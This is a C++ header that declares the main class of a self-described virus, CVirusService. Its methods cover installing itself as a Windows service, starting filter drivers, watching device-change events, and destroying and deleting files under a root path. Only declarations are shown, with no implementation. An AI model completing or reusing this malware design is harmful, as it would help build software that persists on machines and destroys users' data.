/*!
\warning 版权所有 (C) 2007 康林工作室；保留所有权利。
\file    VirusService.h
\brief   病毒主程序
\version 1.0
\author  康  林 (kl222@126.com)
\date    2007年5月31日  15:27:31
\par     编译器:
         Microsoft Visual Studio 8.0 —— C/C++ 8.0
*/

#pragma once
#include "..\..\System\Service\Service.h"
#include "..\..\System\System\System.h"
#include "..\..\System\File\FileEx.h"
#include "FileManage.h"
#include <string>

using namespace std;

#ifdef _UNICODE
#define _tstring wstring
#else
#define _tstring string
#endif // 结束 #ifdef

class CVirusService :
	public CService
{
public:
	CVirusService(const TCHAR* name_);
	~CVirusService(void);

	_tstring GetName(){return m_ServiceName;}

	// 服务
	// - Service main procedure - override to implement a service
	virtual DWORD serviceMain(int argc, TCHAR * argv[]);
	int run();
	virtual void stop();
	INT UnLoad();

	// 安装
	BOOL InstallAndStartService();

	// 破坏
	BOOL IsDestroy();
	BOOL Destroy();
	DWORD DestroyOperateThread(LPCTSTR szRoot);
	static BOOL DestroyOperate(LPCTSTR szRoot);
	static BOOL DeleteFileOperate(LPCTSTR szFile);

private:
	BOOL IsInstalledService(LPCTSTR pszServiceName);
	//开始过滤驱动
	BOOL StartFilterDrivers();
	//设置过滤
	INT SetFilters();

	BOOL RegisterWindow();
	LRESULT OnDeviceChange(WPARAM wParam, LPARAM lParam);
	static LRESULT CALLBACK WndProcess(
		HWND hwnd,             // handle to window
		UINT uMsg,             // message identifier
		WPARAM wParam,         // first message parameter
		LPARAM lParam          // second message parameter
		);
	HWND m_hWnd;               //窗口的句柄

	_tstring m_ServiceName;    //服务名
	CFileManage m_FileManage;  //文件管理

};
